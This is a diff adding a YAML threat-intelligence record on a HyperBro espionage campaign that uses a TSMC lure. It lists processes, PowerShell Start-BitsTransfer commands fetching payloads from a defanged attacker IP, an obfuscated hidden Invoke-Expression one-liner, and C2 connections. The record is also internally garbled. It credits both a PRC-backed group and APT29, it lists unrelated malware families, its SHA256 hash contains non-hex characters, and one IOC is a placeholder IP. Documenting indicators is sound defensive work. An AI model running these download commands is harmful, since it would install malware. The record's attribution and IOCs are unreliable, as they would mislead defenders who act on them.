@@ -1,0 +1,69 @@
+description: EclecticIQ analysts identified a cyber espionage campaign using HyperBro
+  loader variant with a Taiwan Semiconductor Manufacturing (TSMC) lure, targeting
+  Mandarin/Chinese speaking East Asian regions. The campaign overlaps with previously
+  reported activities attributed to PRC-backed cyber espionage groups.
+attribution:
+- threat_actor: PRC-backed nation-state group
+- country: People's Republic of China
+- APT29
+malware_families:
+- HyperBro
+- Cobalt Strike
+- ChargeWeapon
+- Sunburst
+- Kazuar
+TTPs:
+  processes:
+  - vfhost.exe
+  - mcods.exe
+  - svchost.exe
+  - powershell.exe
+  - regsvr32.exe
+  commandline:
+  - vfhost.exe
+  - mcods.exe
+  - C:\Windows\System32\svchost.exe -k netsvcs
+  - C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass
+    -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "$a='Get-Process';
+    $b=Invoke-Expression; & $b $a"
+  powershell:
+  - Start-BitsTransfer http://154[.]93[.]7[.]99:8090/CDGServer3/images/zh/bin.config
+    C:\\ProgramData\\bin.config
+  - Start-BitsTransfer http://154[.]93[.]7[.]99:8090/CDGServer3/images/zh/mcods.exe
+    C:\\ProgramData\\mcods.exe
+  - Start-BitsTransfer http://154[.]93[.]7[.]99:8090/CDGServer3/images/zh/mcvsocfg.dll
+    C:\\ProgramData\\mcvsocfg.dll
+  - $a='Get-Process'; $b=Invoke-Expression; & $b $a
+  scripting_engine:
+  - PowerShell
+  registry_keys:
+  - C:\\Users\\xdd\\Desktop\\VFTRACE\\Release\\VFTRACE.pdb
+  - HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options
+  image_load:
+  - vfhost.exe loading VFTRACE.dll
+  - svchost.exe -> C:\\Windows\\System32\\kernelbase.dll
+  network_connections:
+  - vfhost.exe -> http://38[.]54[.]119[.]239:443/jquery-3.3.1.min.js
+  - ChargeWeapon -> POST request to 45[.]77[.]37[.]145:8443
+  - svchost.exe -> 192.0.2.1:443
+  file_activity:
+  - C:\\ProgramData\\bin.config
+  - C:\\ProgramData\\mcods.exe
+  - C:\\ProgramData\\mcvsocfg.dll
+  - C:\\Users\\xdd\\Desktop\\VFTRACE\\Release\\VFTRACE.pdb
+  - C:\\ProgramData\\tempfile.txt
+  persistence:
+  - Scheduled Task Creation
+  pipes:
+  - Named Pipe
+  process_relations:
+  - vfhost.exe -> VFTRACE.dll
+  - powershell.exe -> svchost.exe
+IOCs:
+- hash: SHA256:1e2b3c4d5f6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2
+- ip: 192.0.2.1
+authors:
+- Arda Büyükkaya
+reference: https://blog.eclecticiq.com/chinese-state-sponsored-cyber-espionage-activity-targeting-semiconductor-industry-in-east-asia
+date_of_publication: October 5, 2023
+file_creation_date: August 12, 2025
